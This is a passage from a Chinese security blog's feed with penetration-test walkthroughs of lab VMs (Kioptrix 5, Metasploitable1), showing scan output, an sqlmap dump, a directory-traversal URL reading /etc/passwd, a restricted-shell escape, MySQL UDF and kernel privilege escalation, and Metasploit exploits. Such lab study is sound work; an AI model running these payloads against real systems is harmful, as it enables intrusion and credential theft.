retrieved: robert                                                                                                                                                                           \nDatabase: members                                                                                                                                                                                             \nTable: members                                                                                                                                                                                                \n[2 entries]                                                                                                                                                                                                   \n+----+-----------------------+----------+                                                                                                                                                                     \n| id | password              | username |                                                                                                                                                                     \n+----+-----------------------+----------+                                                                                                                                                                     \n| 1  | MyNameIsJohn          | john     |                                                                                                                                                                     \n| 2  | ADGAdsafdfwt4gadfga== | robert   |                                                                                                                                                                     \n+----+-----------------------+----------+                                                                                                                                                                     \n                                                                                                                                                                                                              \n[21:30:05] [INFO] table &#39;members.members&#39; dumped to CSV file &#39;/root/.local/share/sqlmap/output/192.168.197.131/dump/members/members.csv&#39;                                                                      \n[21:30:05] [INFO] fetched data logged to text files under &#39;/root/.local/share/sqlmap/output/192.168.197.131&#39;                                                                                                  \n                                                                                                                                                                                                              \n[*] ending @ 21:30:05 /2022-03-22/ \n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br></div></div><p>发现两个用户名和密码，尝试ssh连接</p>\n<p><img src=\"/assets/img/image-20220421172358647.png\" alt=\"image-20220421172358647\" /></p>\n<p>连接成功，可执行的命令很少，明显不是root权限，是一个受限的shell，Restricted Shell</p>\n<p>搜一下Restricted Shell的绕过的一些方法，使用<code>echo os.system(&quot;/bin/bash&quot;)</code> 获取更多命令执行权限</p>\n<p>尝试一些越权方法没有成功，考虑到sql注入，再看mysql，查看运行的账户是root</p>\n<p><img src=\"/assets/img/image-20220421172404792.png\" alt=\"image-20220421172404792\" /></p>\n<p>再去web项目中查看代码，发现root账户不存在密码</p>\n<p><img src=\"/assets/img/image-20220421172409452.png\" alt=\"image-20220421172409452\" /></p>\n<p>连接mysql, 考虑mysql UDF提权，查看lib_mysqludf_sys.so 文件存在，满足udf提权需求</p>\n<p><img src=\"/assets/img/image-20220421172415270.png\" alt=\"image-20220421172415270\" /></p>\n<p><img src=\"/assets/img/image-20220421172419632.png\" alt=\"image-20220421172419632\" /></p>\n<p><img src=\"/assets/img/image-20220421172424068.png\" alt=\"image-20220421172424068\" /></p>\n<p>提权成功</p>\n<p><img src=\"/assets/img/image-20220421172429205.png\" alt=\"image-20220421172429205\" /></p>\n<p>使用另外一种也可以</p>\n<p><img src=\"/assets/img/image-20220421172434086.png\" alt=\"image-20220421172434086\" /></p>\n<p>mysql 提权参考：</p>\n<p>https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</p>\n<p>https://www.sqlsec.com/2020/11/mysql.html</p>\n<p>https://xz.aliyun.com/t/10373</p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421172327093.png",
      "date_published": "2022-03-24T00:00:00.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/0.readme/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/0.readme/",
      "content_html": "<ul>\n<li>\n<p><a href=\"./dc1.html\">DC1 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc2.html\">DC2 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc3.html\">DC3 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc4.html\">DC4 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc5.html\">DC5 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc6.html\">DC6 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc7.html\">DC7 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc8.html\">DC8 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./dc9.html\">DC9 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./Kioptrix_1.html\">Kioptrix_1 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./Kioptrix_2.html\">Kioptrix_2 Walkthrough</a></p>\n</li>\n<li>\n<p><a href=\"./Kioptrix_3.html\">Kioptrix_3</a></p>\n</li>\n<li>\n<p><a href=\"./Kioptrix_4.html\">Kioptrix_4</a></p>\n</li>\n<li>\n<p><a href=\"./Kioptrix_5.html\">Kioptrix_5</a></p>\n</li>\n<li>\n<p><a href=\"./Metasploitable1.html\">Metasploitable1</a></p>\n</li>\n<li>\n<p><a href=\"./MrRobots.html\">MrRobots</a></p>\n</li>\n<li>\n<p><a href=\"./Stapler_1.html\">Stapler_1</a></p>\n</li>\n<li>\n<p><a href=\"./BSides-Vancouver-2018-Workshop.html\">BSides-Vancouver-2018-Workshop.md</a></p>\n</li>\n</ul>\n",
      "date_published": "2022-04-20T06:36:02.000Z",
      "date_modified": "2022-04-21T10:42:28.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "靶机 KIOPTRIX:LEVEL 5 Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_5/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Kioptrix_5/",
      "content_html": "<p>扫描IP</p>\n<p><img src=\"/assets/img/image-20220421172506729.png\" alt=\"image-20220421172506729\" /></p>\n<p>nmap扫描</p>\n<div><pre><code>└─# nmap -T5 -A -v -p- 192.168.197.132\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 06:50 EDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 06:50\nCompleted NSE at 06:50, 0.00s elapsed\nInitiating NSE at 06:50\nCompleted NSE at 06:50, 0.00s elapsed\nInitiating NSE at 06:50\nCompleted NSE at 06:50, 0.00s elapsed\nInitiating ARP Ping Scan at 06:50\nScanning 192.168.197.132 [1 port]\nCompleted ARP Ping Scan at 06:50, 0.05s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 06:50\nCompleted Parallel DNS resolution of 1 host. at 06:50, 13.01s elapsed\nInitiating SYN Stealth Scan at 06:50\nScanning 192.168.197.132 [65535 ports]\nDiscovered open port 8080/tcp on 192.168.197.132\nDiscovered open port 80/tcp on 192.168.197.132\nSYN Stealth Scan Timing: About 46.72% done; ETC: 06:51 (0:00:35 remaining)\nCompleted SYN Stealth Scan at 06:51, 53.64s elapsed (65535 total ports)\nInitiating Service scan at 06:51\nScanning 2 services on 192.168.197.132\nCompleted Service scan at 06:51, 6.01s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 192.168.197.132\nNSE: Script scanning 192.168.197.132.\nInitiating NSE at 06:51\nCompleted NSE at 06:52, 14.53s elapsed\nInitiating NSE at 06:52\nCompleted NSE at 06:52, 1.00s elapsed\nInitiating NSE at 06:52\nCompleted NSE at 06:52, 0.00s elapsed\nNmap scan report for 192.168.197.132\nHost is up (0.00036s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nPORT     STATE  SERVICE VERSION\n22/tcp   closed ssh\n80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)\n| http-methods: \n|_  Supported Methods: HEAD\n8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)\n|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8\nMAC Address: 00:0C:29:61:02:8E (VMware)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.36 ms 192.168.197.132\n\nNSE: Script Post-scanning.\nInitiating NSE at 06:52\nCompleted NSE at 06:52, 0.00s elapsed\nInitiating NSE at 06:52\nCompleted NSE at 06:52, 0.00s elapsed\nInitiating NSE at 06:52\nCompleted NSE at 06:52, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 91.00 seconds\n           Raw packets sent: 131166 (5.774MB) | Rcvd: 51 (2.136KB)\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br></div></div><p>nikto扫描</p>\n<div><pre><code>└─# nikto -host 192.168.197.132       \n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          192.168.197.132\n+ Target Hostname:    192.168.197.132\n+ Target Port:        80\n+ Start Time:         2022-03-23 06:52:45 (GMT-4)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8\n+ Server may leak inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 13:22:52 2014\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)\n+ PHP/5.3.8 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.\n+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.\n+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.\n+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE \n+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST\n+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.\n\n+ 8724 requests: 0 error(s) and 11 item(s) reported on remote host\n+ End Time:           2022-03-23 06:54:08 (GMT-4) (83 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><p>发现mod_ssl存在问题</p>\n<p>搜索exp</p>\n<p><img src=\"/assets/img/image-20220421172516377.png\" alt=\"image-20220421172516377\" /></p>\n<p>编译764.c，发现错误</p>\n<p><img src=\"/assets/img/image-20220421172522539.png\" alt=\"image-20220421172522539\" /></p>\n<p>安装 libssl1.0-dev, 头文件添加</p>\n<div><pre><code>#include &lt;openssl/rc4.h&gt;\n#include &lt;openssl/md5.h&gt;\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>编译通过,运行失败，mod_ssl漏洞不能利用，尝试其他办法</p>\n<p>访问web，查看页面代码，发现一个注释隐藏页面，访问</p>\n<p><img src=\"/assets/img/image-20220421172531510.png\" alt=\"image-20220421172531510\" /></p>\n<p><img src=\"/assets/img/image-20220421172539432.png\" alt=\"image-20220421172539432\" /></p>\n<p>从url中可以看出使用了pchart，搜索exp</p>\n<p><img src=\"/assets/img/image-20220421172545636.png\" alt=\"image-20220421172545636\" /></p>\n<p>存在目录遍历漏洞，访问http://192.168.197.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../etc/passwd，确实存在漏洞</p>\n<p><img src=\"/assets/img/image-20220421172549864.png\" alt=\"image-20220421172549864\" /></p>\n<p>查看配置文件 /usr/local/etc/apache22/httpd.conf</p>\n<p><img src=\"/assets/img/image-20220421172554391.png\" alt=\"image-20220421172554391\" /></p>\n<p>有一段访问限制</p>\n<div><pre><code>curl -H &quot;User-Agent:Mozilla/4.0&quot; http://192.168.1.68:8080\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20220421172559974.png\" alt=\"image-20220421172559974\" /></p>\n<p><img src=\"/assets/img/image-20220421172603600.png\" alt=\"image-20220421172603600\" /></p>\n<p>这里使用了phptax，<em>PhpTax</em>是美国收入所得税计算软件。搜索exp</p>\n<p><img src=\"/assets/img/image-20220421172608440.png\" alt=\"image-20220421172608440\" /></p>\n<p>使用msf</p>\n<p><img src=\"/assets/img/image-20220421172612545.png\" alt=\"image-20220421172612545\" /></p>\n<p><img src=\"/assets/img/image-20220421172616949.png\" alt=\"image-20220421172616949\" /></p>\n<p><img src=\"/assets/img/image-20220421172621352.png\" alt=\"image-20220421172621352\" /></p>\n<p><img src=\"/assets/img/image-20220421172625399.png\" alt=\"image-20220421172625399\" /></p>\n<p>拿到shell，不是root权限，查看linux版本提权exp</p>\n<p><img src=\"/assets/img/image-20220421172629941.png\" alt=\"image-20220421172629941\" /></p>\n<p>但是目标不支持wget命令，尝试nc命令支持，利用nc上传提权代码</p>\n<p><img src=\"/assets/img/image-20220421172634994.png\" alt=\"image-20220421172634994\" /></p>\n<p><img src=\"/assets/img/image-20220421172642313.png\" alt=\"image-20220421172642313\" /></p>\n<p>编译，运行，提权成功</p>\n<p><img src=\"/assets/img/image-20220421172646403.png\" alt=\"image-20220421172646403\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421172506729.png",
      "date_published": "2022-03-25T00:00:00.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 Metasploitable1 Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Metasploitable1/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Metasploitable1/",
      "content_html": "<p>扫描目标IP</p>\n<div><pre><code>┌──<span>(</span>root💀kali<span>)</span>-<span>[</span>/home/kali<span>]</span>\n└─<span># nmap -sS 192.168.197.0/24                                          127 ⨯</span>\nStarting Nmap <span>7.92</span> <span>(</span> https://nmap.org <span>)</span> at <span>2022</span>-03-11 04:41 EST\nNmap scan report <span>for</span> <span>192.168</span>.197.1\nHost is up <span>(</span><span>0</span>.00042s latency<span>)</span>.\nAll <span>1000</span> scanned ports on <span>192.168</span>.197.1 are <span>in</span> ignored states.\nNot shown: <span>1000</span> filtered tcp ports <span>(</span>no-response<span>)</span>\nMAC Address: 00:50:56:C0:00:01 <span>(</span>VMware<span>)</span>\n\nNmap scan report <span>for</span> <span>192.168</span>.197.129\nHost is up <span>(</span><span>0</span>.0015s latency<span>)</span>.\nNot shown: <span>988</span> closed tcp ports <span>(</span>reset<span>)</span>\nPORT     STATE SERVICE\n<span>21</span>/tcp   <span>open</span>  <span>ftp</span>\n<span>22</span>/tcp   <span>open</span>  <span>ssh</span>\n<span>23</span>/tcp   <span>open</span>  telnet\n<span>25</span>/tcp   <span>open</span>  smtp\n<span>53</span>/tcp   <span>open</span>  domain\n<span>80</span>/tcp   <span>open</span>  http\n<span>139</span>/tcp  <span>open</span>  netbios-ssn\n<span>445</span>/tcp  <span>open</span>  microsoft-ds\n<span>3306</span>/tcp <span>open</span>  mysql\n<span>5432</span>/tcp <span>open</span>  postgresql\n<span>8009</span>/tcp <span>open</span>  ajp13\n<span>8180</span>/tcp <span>open</span>  unknown\nMAC Address: 00:0C:29:80:6A:26 <span>(</span>VMware<span>)</span>\n\nNmap scan report <span>for</span> <span>192.168</span>.197.254\nHost is up <span>(</span><span>0</span>.000099s latency<span>)</span>.\nAll <span>1000</span> scanned ports on <span>192.168</span>.197.254 are <span>in</span> ignored states.\nNot shown: <span>1000</span> filtered tcp ports <span>(</span>no-response<span>)</span>\nMAC Address: 00:50:56:FA:70:CD <span>(</span>VMware<span>)</span>\n\nNmap scan report <span>for</span> <span>192.168</span>.197.128\nHost is up <span>(</span><span>0</span>.0000030s latency<span>)</span>.\nAll <span>1000</span> scanned ports on <span>192.168</span>.197.128 are <span>in</span> ignored states.\nNot shown: <span>1000</span> closed tcp ports <span>(</span>reset<span>)</span>\n\nNmap done: <span>256</span> IP addresses <span>(</span><span>4</span> hosts up<span>)</span> scanned <span>in</span> <span>34.43</span> seconds\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br></div></div><p>发现ip <code>192.168.197.129</code></p>\n<p>扫描主机</p>\n<div><pre><code>┌──(kali㉿kali)-[~]\n└─$ nmap -T5 -A -v -p- 192.168.197.129\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-11 04:45 EST\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 04:45\nCompleted NSE at 04:45, 0.00s elapsed\nInitiating NSE at 04:45\nCompleted NSE at 04:45, 0.00s elapsed\nInitiating NSE at 04:45\nCompleted NSE at 04:45, 0.00s elapsed\nInitiating Ping Scan at 04:45\nScanning 192.168.197.129 [2 ports]\nCompleted Ping Scan at 04:45, 0.00s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 04:45\nCompleted Parallel DNS resolution of 1 host. at 04:45, 13.01s elapsed\nInitiating Connect Scan at 04:45\nScanning 192.168.197.129 [65535 ports]\nDiscovered open port 80/tcp on 192.168.197.129\nDiscovered open port 139/tcp on 192.168.197.129\nDiscovered open port 53/tcp on 192.168.197.129\nDiscovered open port 23/tcp on 192.168.197.129\nDiscovered open port 3306/tcp on 192.168.197.129\nDiscovered open port 21/tcp on 192.168.197.129\nDiscovered open port 445/tcp on 192.168.197.129\nDiscovered open port 22/tcp on 192.168.197.129\nDiscovered open port 25/tcp on 192.168.197.129\nDiscovered open port 8180/tcp on 192.168.197.129\nDiscovered open port 3632/tcp on 192.168.197.129\nDiscovered open port 5432/tcp on 192.168.197.129\nDiscovered open port 8009/tcp on 192.168.197.129\nCompleted Connect Scan at 04:45, 1.56s elapsed (65535 total ports)\nInitiating Service scan at 04:45\nScanning 13 services on 192.168.197.129\nCompleted Service scan at 04:46, 21.02s elapsed (13 services on 1 host)\nNSE: Script scanning 192.168.197.129.\nInitiating NSE at 04:46\nCompleted NSE at 04:46, 22.17s elapsed\nInitiating NSE at 04:46\nCompleted NSE at 04:47, 67.23s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, 0.00s elapsed\nNmap scan report for 192.168.197.129\nHost is up (0.0044s latency).\nNot shown: 65522 closed tcp ports (conn-refused)\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         ProFTPD 1.3.1\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n23/tcp   open  telnet      Linux telnetd\n25/tcp   open  smtp        Postfix smtpd\n|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN\n53/tcp   open  domain      ISC BIND 9.4.2\n| dns-nsid: \n|_  bind.version: 9.4.2\n80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)\n|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch\n|_http-title: Site doesn&#39;t have a title (text/html).\n| http-methods: \n|   Supported Methods: GET HEAD POST OPTIONS TRACE\n|_  Potentially risky methods: TRACE\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.0.51a-3ubuntu5\n|   Thread ID: 17\n|   Capabilities flags: 43564\n|   Some Capabilities: SupportsCompression, SwitchToSSLAfterHandshake, ConnectWithDatabase, SupportsTransactions, Support41Auth, Speaks41ProtocolNew, LongColumnFlag\n|   Status: Autocommit\n|_  Salt: b+Jv39beSOrqar&lt;n9pGT\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\n5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7\n|_ssl-date: 2022-03-11T09:46:55+00:00; +21s from scanner time.\n| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX\n| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2010-03-17T14:07:45\n| Not valid after:  2010-04-16T14:07:45\n| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828\n|_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6\n8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)\n|_ajp-methods: Failed to get a valid response for the OPTION request\n8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1\n|_http-title: Apache Tomcat/5.5\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-favicon: Apache Tomcat\nService Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 1h40m21s, deviation: 2h53m12s, median: 20s\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| Names:\n|   METASPLOITABLE&lt;00&gt;   Flags: &lt;unique&gt;&lt;active&gt;\n|   METASPLOITABLE&lt;03&gt;   Flags: &lt;unique&gt;&lt;active&gt;\n|   METASPLOITABLE&lt;20&gt;   Flags: &lt;unique&gt;&lt;active&gt;\n|   \\x01\\x02__MSBROWSE__\\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;\n|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;\n|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;\n|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: metasploitable\n|   NetBIOS computer name: \n|   Domain name: localdomain\n|   FQDN: metasploitable.localdomain\n|_  System time: 2022-03-11T04:46:26-05:00\n\nNSE: Script Post-scanning.\nInitiating NSE at 04:47\nCompleted NSE at 04:47, 0.00s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, 0.00s elapsed\nInitiating NSE at 04:47\nCompleted NSE at 04:47, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 125.30 seconds\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br></div></div><h2 id=\"\"> </h2>\n<p>发现139端口，使用nslookup查看主机名</p>\n<p><img src=\"/assets/img/image-20220421172748715.png\" alt=\"image-20220421172748715\" /></p>\n<p>使用smbclient，查看共享</p>\n<p><img src=\"/assets/img/image-20220421172752181.png\" alt=\"image-20220421172752181\" /></p>\n<p>查看tmp下内容，未发现特殊内容</p>\n<p><img src=\"/assets/img/image-20220421172757852.png\" alt=\"image-20220421172757852\" /></p>\n<p>根据前面发现的samba 3.0.20版本，搜索可以发现存在漏洞，可以使用metasploit攻击</p>\n<p><img src=\"/assets/img/image-20220421172802769.png\" alt=\"image-20220421172802769\" /></p>\n<p><img src=\"/assets/img/image-20220421172808330.png\" alt=\"image-20220421172808330\" /></p>\n<p><img src=\"/assets/img/image-20220421172813254.png\" alt=\"image-20220421172813254\" /></p>\n<p><img src=\"/assets/img/image-20220421172817905.png\" alt=\"image-20220421172817905\" /></p>\n<p>攻击成功，拿到root</p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421172748715.png",
      "date_published": "2022-03-28T00:00:00.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
